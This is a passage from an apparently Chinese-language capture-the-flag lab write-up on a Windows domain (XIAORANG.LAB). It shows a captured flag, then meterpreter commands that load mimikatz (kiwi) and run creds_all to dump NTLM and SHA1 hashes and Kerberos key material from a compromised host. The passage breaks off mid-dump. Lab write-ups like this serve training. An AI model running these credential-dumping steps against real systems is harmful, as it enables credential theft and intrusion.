<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag---02">flag - 02<a href="#flag---02" class="hash-link" aria-label="flag - 02的直接链接" title="flag - 02的直接链接">​</a></h2>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> ________  _______   ___       _______   ________  ________  _________  ___  ________  ________</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|\   ___ \|\  ___ \ |\  \     |\  ___ \ |\   ____\|\   __  \|\___   ___\\  \|\   __  \|\   ___  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\ \  \_|\ \ \   __/|\ \  \    \ \   __/|\ \  \___|\ \  \|\  \|___ \  \_\ \  \ \  \|\  \ \  \\ \  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> \ \  \ \\ \ \  \_|/_\ \  \    \ \  \_|/_\ \  \  __\ \   __  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  \ \  \_\\ \ \  \_|\ \ \  \____\ \  \_|\ \ \  \|\  \ \  \ \  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   \ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\   \ \__\ \ \__\ \_______\ \__\\ \__\</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    \|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__|    \|__|  \|__|\|_______|\|__| \|__|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag02: flag{8012e1e3-a8e1-4d81-81a1-08cb05b91dd6}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="17222445-xiaorangwin19-抓取域内信息">172.22.4.45 XIAORANG\WIN19 抓取域内信息<a href="#17222445-xiaorangwin19-抓取域内信息" class="hash-link" aria-label="172.22.4.45 XIAORANG\WIN19 抓取域内信息的直接链接" title="172.22.4.45 XIAORANG\WIN19 抓取域内信息的直接链接">​</a></h2>
<p>加载 <code>mimikatz</code> 模块</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> load kiwi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Loading extension kiwi</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token builtin class-name">.</span><span class="token comment" style="color:#999988;font-style:italic">#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token comment" style="color:#999988;font-style:italic">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;## v ##&#x27;</span><span class="token plain">        Vincent LE TOUX            </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">vincent.letoux@gmail.com</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">&#x27;#####&#x27;</span><span class="token plain">         </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> http://pingcastle.com / http://mysmartlogon.com  ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Success.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>获取所有凭据</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> creds_all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Running as SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Retrieving all credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msv credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username  Domain    NTLM                              SHA1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------  ------    ----                              ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Adrian    WIN19     3008c87294511142799dca1191e69a0f  b7bc3a1b04d9e165c6762b0a1cde5226df5b6a6a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN19$    XIAORANG  22efd36d08f27afdf0628d9ba2bff827  01fdaaa6a61872baf4abcd2014135d01cc3ed463</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wdigest credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username  Domain    Password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------  ------    --------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Adrian    WIN19     </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN19$    XIAORANG  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kerberos credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username  Domain        Password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------  ------        --------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Adrian    WIN19         </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN19$    xiaorang.lab  </span><span class="token number" style="color:#36acaa">62</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">99</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">91</span><span class="token plain"> 1f f6 </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">37</span><span class="token plain"> 9c </span><span class="token number" style="color:#36acaa">72</span><span class="token plain"> d0 6b e6 f2 </span><span class="token number" style="color:#36acaa">49</span><span class="token plain"> 4f </span><span class="token number" style="color:#36acaa">35</span><span class="token plain"> c3 </span><span class="token number" style="color:#36acaa">30</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">83</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66</span><span class="token plain"> 2c d0 07 02 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain"> 1b </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> f2 </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> be </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 7f 4e a2 f8 6a e0 2e a7 aa cc e2 </span><span class="token number" style="color:#36acaa">58</span><span class="token plain"> c1 0c 6d </span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> ad </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><span class="token plain"> cf 7b f8 1a e8 c0 ec 9b a7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> e3 f0 f5 ed </span><span class="token number" style="color:#36acaa">73</span><span class="token plain"> b0 2e 7b </span><span class="token builtin class-name">cd</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">70</span><span class="token plain"> b8 ad b6 03 </span><span class="token number" style="color:#36acaa">57</span><span class="token plain"> d7 </span><span class="token number" style="color:#36acaa">56</span><span class="token plain"> cc fd f0 9b c2 f7 </span><span class="token number" style="color:#36acaa">71</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">81</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> 05 </span><span class="token number" style="color:#36acaa">54</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">92</span><span class="token plain"> 1b 9b 4e </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"> fa 6a 7e 7a ea eb </span><span class="token number" style="color:#36acaa">56</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">29</span><span class="token plain"> cf 8d </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">79</span><span class="token plain"> a6 </span><span class="token number" style="color:#36acaa">13</span><span class="token plain"> 5a cc e2 fa 6d </span><span class="token number" style="color:#36acaa">69</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> bf 2e bb e9 b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> 3b 7e af e3 </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> d6 9e 5d 1f 8d </span><span class="token number" style="color:#36acaa">67</span><span class="token plain"> 0b a8 4e eb f4 c1 c9 1f </span><span class="token number" style="color:#36acaa">29</span><span class="token plain"> 0f </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> cc a9 ee </span><span class="token number" style="color:#36acaa">57</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain"> a9 8e bf </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">35</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"> 0f fb fb </span><span class="token number" style="color:#36acaa">41</span><span class="token plain"> f1 e7 07 da f0 </span><span class="token number" style="color:#36acaa">18</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token plain"> 6f e8 </span><span class="token number" style="color:#36acaa">61</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">28</span><span class="token plain"> 05 </span><span class="token number" style="color:#36acaa">91</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">63</span><span class="token plain"> a1 bd d8 </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">27</span><span class="token plain"> 04 </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        00 a8 </span><span class="token number" style="color:#36acaa">65</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain"> 8f 7b e5 5e 9a a5 f9 08 da 01 d3 8d de 7b be 6d bd </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">68</span><span class="token plain"> 6a </span><span class="token number" style="color:#36acaa">79</span><span class="token plain"> 6d </span><span class="token number" style="color:#36acaa">17</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">93</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">72</span><span class="token plain"> 4b f2 01 </span><span class="token number" style="color:#36acaa">29</span><span class="token plain"> 9f </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><span class="token plain"> 2c a9 c8 </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> 02 </span><span class="token number" style="color:#36acaa">67</span><span class="token plain"> 4e </span><span class="token number" style="color:#36acaa">50</span><span class="token plain"> cf </span><span class="token number" style="color:#36acaa">64</span><span class="token plain"> eb 2b 5f </span><span class="token number" style="color:#36acaa">83</span><span class="token plain"> 4d </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">93</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">95</span><span class="token plain"> 0c f4 ba 8d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN19$    xiaorang.lab  3a </span><span class="token number" style="color:#36acaa">94</span><span class="token plain"> de 4d </span><span class="token number" style="color:#36acaa">87</span><span class="token plain"> 8e 7d </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">88</span><span class="token plain"> ec 9c </span><span class="token number" style="color:#36acaa">70</span><span class="token plain"> fd f0 c5 3e 4c f3 ce 6a </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">79</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> c6 2f f9 </span><span class="token number" style="color:#36acaa">52</span><span class="token plain"> 9b 4e 1d </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">58</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">52</span><span class="token plain"> 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 </span><span class="token number" style="color:#36acaa">82</span><span class="token plain"> c0 6e f4 1b </span><span class="token number" style="color:#36acaa">81</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">93</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">59</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">67</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         </span><span class="token number" style="color:#36acaa">54</span><span class="token plain"> de </span><span class="token number" style="color:#36acaa">17</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">82</span><span class="token plain"> d7 c3 </span><span class="token number" style="color:#36acaa">82</span><span class="token plain"> c5 </span><span class="token number" style="color:#36acaa">38</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token plain"> 4f d0 </span><span class="token number" style="color:#36acaa">55</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">98</span><span class="token plain"> f6 a2 cc e7 cb </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">84</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">35</span><span class="token plain"> 8a 0c 2e 9f d1 </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"> 0c 0f c1 ea 0d d9 c5 d9 7f </span><span class="token number" style="color:#36acaa">29</span><span class="token plain"> a3 </span><span class="token number" style="color:#36acaa">57</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> 6b bf a4 b9 </span><span class="token number" style="color:#36acaa">73</span><span class="token plain"> 9a </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">84</span><span class="token plain"> 1d </span><span class="token function" style="color:#d73a49">df</span><span class="token plain"> 3f </span><span class="token number" style="color:#36acaa">33</span><span class="token plain"> f5 </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> e4 ee 2e d3 </span><span class="token number" style="color:#36acaa">88</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token builtin class-name">cd</span><span class="token plain"> a5 6e ac e3 eb </span><span class="token number" style="color:#36acaa">71</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">43</span><span class="token plain"> ed 7c b8 a2 9e </span><span class="token number" style="color:#36acaa">52</span><span class="token plain"> d5 </span><span class="token number" style="color:#36acaa">31</span><span class="token plain"> 1c </span><span class="token number" style="color:#36acaa">50</span><span class="token plain"> 9b c8 </span><span class="token number" style="color:#36acaa">71</span><span class="token plain"> 03 e1 8e 4f </span><span class="token number" style="color:#36acaa">60</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">84</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> 02 e2 8d </span><span class="token number" style="color:#36acaa">92</span><span class="token plain"> 3f </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> 0b </span><span class="token number" style="color:#36acaa">38</span><span class="token plain"> 2c </span><span class="token number" style="color:#36acaa">13</span><span class="token plain"> c1 0e 6b </span><span class="token number" style="color:#36acaa">64</span><span class="token plain"> a7 fc 7a 2a a5 0e e0 b0 </span><span class="token number" style="color:#36acaa">66</span><span class="token plain"> a9 a0 2f 8d 8d </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> f8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token number" style="color:#36acaa">72</span><span class="token plain"> d3 </span><span class="token number" style="color:#36acaa">36</span><span class="token plain"> d3 3a a9 0d 3f b9 00 ef 3e </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"> d9 </span><span class="token number" style="color:#36acaa">36</span><span class="token plain"> a2 ad </span><span class="token number" style="color:#36acaa">36</span><span class="token plain"> 2a </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> </span><span class="token builtin class-name">cd</span><span class="token plain"> a0 cc 5b f4 0e a4 6b d3 </span><span class="token number" style="color:#36acaa">24</span><span class="token plain"> 8e 6e </span><span class="token number" style="color:#36acaa">99</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">59</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token plain"> d9 f8 a7 </span><span class="token number" style="color:#36acaa">26</span><span class="token plain"> 09 </span><span class="token number" style="color:#36acaa">58</span><span class="token plain"> 0a c2 3a </span><span class="token number" style="color:#36acaa">69</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">56</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">76</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> b9 </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">92</span><span class="token plain"> a7 5c aa 3d e1 d0 1f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">win19$    XIAORANG.LAB  </span><span class="token number" style="color:#36acaa">62</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">99</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">91</span><span class="token plain"> 1f f6 </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">37</span><span class="token plain"> 9c </span><span class="token number" style="color:#36acaa">72</span><span class="token plain"> d0 6b e6 f2 </span><span class="token number" style="color:#36acaa">49</span><span class="token plain"> 4f </span><span class="token number" style="color:#36acaa">35</span><span class="token plain"> c3 </span><span class="token number" style="color:#36acaa">30</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">83</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66</span><span class="token plain"> 2c d0 07 02 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain"> 1b </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> f2 </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> be </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 7f 4e a2 f8 6a e0 2e a7 aa cc e2 </span><span class="token number" style="color:#36acaa">58</span><span class="token plain"> c1 0c 6d </span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> ad </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><span class="token plain"> cf 7b f8 1a e8 c0 ec 9b a7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> e3 f0 f5 ed </span><span class="token number" style="color:#36acaa">73</span><span class="token plain"> b0 2e 7b </span><span class="token builtin class-name">cd</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">70</span><span class="token plain"> b8 ad b6 03 </span><span class="token number" style="color:#36acaa">57</span><span class="token plain"> d7 </span><span class="token number" style="color:#36acaa">56</span><span class="token plain"> cc fd f0 9b c2 f7 </span><span class="token number" style="color:#36acaa">71</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">81</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> 05 </span><span class="token number" style="color:#36acaa">54</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">92</span><span class="token plain"> 1b 9b 4e </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"> fa 6a 7e 7a ea eb </span><span class="token number" style="color:#36acaa">56</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">29</span><span class="token plain"> cf 8d </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">79</span><span class="token plain"> a6 </span><span class="token number" style="color:#36acaa">13</span><span class="token plain"> 5a cc e2 fa 6d </span><span class="token number" style="color:#36acaa">69</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> bf 2e bb e9 b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> 3b 7e af e3 </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> d6 9e 5d 1f 8d </span><span class="token number" style="color:#36acaa">67</span><span class="token plain"> 0b a8 4e eb f4 c1 c9 1f </span><span class="token number" style="color:#36acaa">29</span><span class="token plain"> 0f </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> cc a9 ee </span><span class="token number" style="color:#36acaa">57</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain"> a9 8e bf </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">35</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"> 0f fb fb </span><span class="token number" style="color:#36acaa">41</span><span class="token plain"> f1 e7 07 da f0 </span><span class="token number" style="color:#36acaa">18</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token plain"> 6f e8 </span><span class="token number" style="color:#36acaa">61</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">28</span><span class="token plain"> 05 </span><span class="token number" style="color:#36acaa">91</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">63</span><span class="token plain"> a1 bd d8 </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">27</span><span class="token plain"> 04 </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        00 a8 </span><span class="token number" style="color:#36acaa">65</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain"> 8f 7b e5 5e 9a a5 f9 08 da 01 d3 8d de 7b be 6d bd </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">68</span><span class="token plain"> 6a </span><span class="token number" style="color:#36acaa">79</span><span class="token plain"> 6d </span><span class="token number" style="color:#36acaa">17</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">93</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">72</span><span class="token plain"> 4b f2 01 </span><span class="token number" style="color:#36acaa">29</span><span class="token plain"> 9f </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><span class="token plain"> 2c a9 c8 </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> 02 </span><span class="token number" style="color:#36acaa">67</span><span class="token plain"> 4e </span><span class="token number" style="color:#36acaa">50</span><span class="token plain"> cf </span><span class="token number" style="color:#36acaa">64</span><span class="token plain"> eb 2b 5f </span><span class="token number" style="color:#36acaa">83</span><span class="token plain"> 4d </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">93</span><span class="token plain"> 